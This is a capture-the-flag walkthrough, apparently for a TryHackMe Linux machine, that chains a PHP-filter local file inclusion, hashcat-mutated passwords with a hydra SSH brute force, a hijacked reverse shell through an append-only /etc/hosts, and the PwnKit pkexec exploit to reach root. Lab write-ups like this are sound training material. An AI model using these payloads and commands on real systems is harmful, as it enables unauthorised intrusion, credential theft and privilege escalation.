# 🧠 Target Machine Writeup

- **Target:** 10.67.181.249  
- **OS:** Linux  
- **Difficulty:** Easy  

---

# 🔎 Initial Nmap Scan

```bash
nmap -Pn -n -p- --min-rate 2500 -sVC 10.67.181.249 -oN scan.txt
```

## 📌 Results

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service Info: OS: Linux
```

### 📝 Observations
- SSH running on port 22
- Apache web server running on port 80
- Web title: **Atlanta - Free business bootstrap template**
- Requested resource: `/index.php?page=home.html`

---

# 🌐 Web Enumeration

After browsing the web application, we discovered that it is vulnerable to **LFI (Local File Inclusion)**.

## ❌ First Attempt

```bash
http://10.67.181.249/index.php?page=../../../../../../../etc/passwd
```

This did not work.

---

## ✅ Using PHP Wrapper

```bash
http://10.67.181.249/index.php?page=php://filter/resource=/etc/passwd
```

### 📌 Output (Important Users)

```bash
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```

We identified two valid system users:
- `blue`
- `red`

---

# 🏠 Enumerating User Files

## 🔑 Checking SSH Keys

```bash
php://filter/resource=/home/blue/.ssh/id_rsa
```

Nothing useful found.

---

## 📜 Checking Bash History

```bash
php://filter/resource=/home/blue/.bash_history
```

### 📌 Output

```bash
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

This tells us:
- A file called `.reminder` exists.
- It was processed using `hashcat` rules (`best64.rule`).

---

# 🔓 Retrieving `.reminder`

We accessed the file and found:

```
sup3r_p@s$w0rd!
```

Trying this password directly for SSH did NOT work.

---

# 💡 Reproducing Hashcat Rule Mutation

From `.bash_history`, we saw:

```bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

So we recreated the same process on our attacker machine.

```bash
echo 'sup3r_p@s$w0rd!' > .reminder
```

```bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

---

# 🚀 Brute Forcing SSH

```bash
hydra -l blue -P passlist.txt ssh://10.67.181.249
```

We successfully logged in as `blue`.

## 🏁 Flag 1

```
THM{Is_thAt_all_y****}
```

---

# 🔼 Privilege Escalation (Blue → Red)

Initial enumeration (including `linpeas`) did not reveal anything interesting.

We were given a hint to use **pspy** to monitor running processes.

---

## 📥 Download pspy

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Upload it to `/tmp` on the target machine and execute it.

---

## 👀 Process Monitoring

We observed that the `red` user was attempting to get a reverse shell to:

```
redrules.thm
```

Checking `/etc/hosts`, we found:

```
192.168.0.1 redrules.thm
```

Attempting to modify the file resulted in:

```
Operation not permitted
```

---

## 🔎 Checking File Attributes

```bash
lsattr /etc/hosts
```

Output:

```
-----a--------e----- /etc/hosts
```

The `a` attribute means:
- The file is **append-only**
- We cannot delete or modify existing lines
- But we CAN append new entries

---

## 🧠 Exploit Strategy

Append our Kali IP:

```bash
echo "KALI_IP redrules.thm" >> /etc/hosts
```

Then open a listener:

```bash
nc -lnvp 9001
```

After waiting a few moments, we received a reverse shell as `red`.

---

## 🏁 Flag 2

```
THM{Y0u_won't_mak3_IT_fur*******}
```

---

# 🔴 Privilege Escalation (Red → Root)

After enumeration as `red`, we discovered an interesting `.git` directory.

Inside it, we found a `pkexec` binary with SUID permissions.

---

## 🔍 Checking Version

```bash
./pkexec --version
```

Output:

```
pkexec version 0.105
```

This version is vulnerable to **CVE-2021-4034 (PwnKit)**.

---

# 💣 Exploiting CVE-2021-4034

Found exploit repository:

```
http://github.com/Almorabea/pkexec-exploit
```

⚠️ Important: Do NOT open nano inside the reverse shell — it will break the shell.

---

## ✏️ Modify Exploit Code

Change the last line from:

```python
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
```

To:

```python
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

---

##  Execute Exploit

```bash
chmod +x CVE-2021-4034.py
./CVE-2021-4034.py
```

Successfully obtained **root privileges**.

---

## 🏁 Flag 3

```
THM{Go0d_Gam3****}
```

---

# 🎯 Final Summary

1. Discovered LFI vulnerability.
2. Retrieved `.bash_history`.
3. Recreated hashcat rule mutation.
4. Brute forced SSH.
5. Used `pspy` to monitor processes.
6. Abused append-only `/etc/hosts`.
7. Intercepted reverse shell.
8. Exploited vulnerable `pkexec` (CVE-2021-4034).
9. Gained root access.

---

